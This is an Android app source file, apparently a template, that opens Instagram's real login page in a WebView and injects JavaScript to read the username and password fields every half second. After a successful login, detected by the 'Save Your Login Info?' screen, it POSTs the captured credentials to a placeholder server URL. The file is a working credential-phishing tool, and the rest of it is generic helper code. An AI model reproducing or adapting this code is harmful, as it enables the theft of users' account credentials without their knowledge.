package prateek.th30neand0nly;

import android.app.Activity;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.util.regex.*;
import java.text.*;
import org.json.*;
import java.util.HashMap;
import android.widget.TextView;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.DialogFragment;


public class MainActivity extends  Activity { 
	
	
	private HashMap<String, Object> instadatamap = new HashMap<>();
	private String YOUR_SERVER_URL = "";
	
	private TextView textview1;
	private WebView webview1;
	
	private RequestNetwork r;
	private RequestNetwork.RequestListener _r_request_listener;
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.main);
		initialize(_savedInstanceState);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		
		textview1 = (TextView) findViewById(R.id.textview1);
		webview1 = (WebView) findViewById(R.id.webview1);
		webview1.getSettings().setJavaScriptEnabled(true);
		webview1.getSettings().setSupportZoom(true);
		r = new RequestNetwork(this);
		
		webview1.setWebViewClient(new WebViewClient() {
			@Override
			public void onPageStarted(WebView _param1, String _param2, Bitmap _param3) {
				final String _url = _param2;
				
				super.onPageStarted(_param1, _param2, _param3);
			}
			
			@Override
			public void onPageFinished(WebView _param1, String _param2) {
				final String _url = _param2;
				if (_url.contains("https://www.instagram.com/")) {
					webview1.loadUrl("javascript:(function(){"+"setInterval( () => {"+"var usr= document.getElementsByName('username')[0].value; "+"var upass= document.getElementsByName('password')[0].value; "+" Android.sendData('<b>Username:-</b>' +usr+'<b> Pass:- </b>'+ upass)" +"},500);})()");
				}
				webview1.evaluateJavascript(
				    "(function() { return ('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>'); })();",
				     new ValueCallback<String>() {
					        @Override
					        public void onReceiveValue(String html) {

						           // Log.d("HTML", html);  
						            // code here
						       
						if (html.contains("Save Your Login Info?") && html.contains("coreSpriteKeyhole")) {
							instadatamap.clear();
							instadatamap = new HashMap<>();
							instadatamap.put("data", textview1.getText().toString());
							r.setParams(instadatamap, RequestNetworkController.REQUEST_PARAM);
							r.startRequestNetwork(RequestNetworkController.POST, YOUR_SERVER_URL, "", _r_request_listener);
						}
						 }
				});
				super.onPageFinished(_param1, _param2);
			}
		});
		
		_r_request_listener = new RequestNetwork.RequestListener() {
			@Override
			public void onResponse(String _param1, String _param2, HashMap<String, Object> _param3) {
				final String _tag = _param1;
				final String _response = _param2;
				final HashMap<String, Object> _responseHeaders = _param3;
				
			}
			
			@Override
			public void onErrorResponse(String _param1, String _param2) {
				final String _tag = _param1;
				final String _message = _param2;
				
			}
		};
	}
	
	private void initializeLogic() {
		YOUR_SERVER_URL = "YOUR_PHP_FILE_URL";
		webview1.getSettings().setDomStorageEnabled(true); webview1.getSettings().setDatabaseEnabled(true); if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) { webview1.getSettings().setDatabasePath("/data/data/" + webview1.getContext().getPackageName() + "/databases/"); }
		WebView webView = (WebView) findViewById(R.id.webview1);
		webView.addJavascriptInterface(new WebAppInterface(this), "Android");
		webview1.loadUrl("https://instagram.com");
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		
		super.onActivityResult(_requestCode, _resultCode, _data);
		
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	@Override
	public void onBackPressed() {
		if (webview1.canGoBack()) {
			webview1.goBack();
		}
		else {
			finishAffinity();
		}
	}
	public void _interfacef () {
	}
	public class WebAppInterface {
		Context mContext;
		WebAppInterface(Context c) {
			mContext = c;
		}
		@JavascriptInterface
		public void sendData(String toast) {
			textview1.setText(toast);
			
		}
		
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input){
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels(){
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels(){
		return getResources().getDisplayMetrics().heightPixels;
	}
	
}
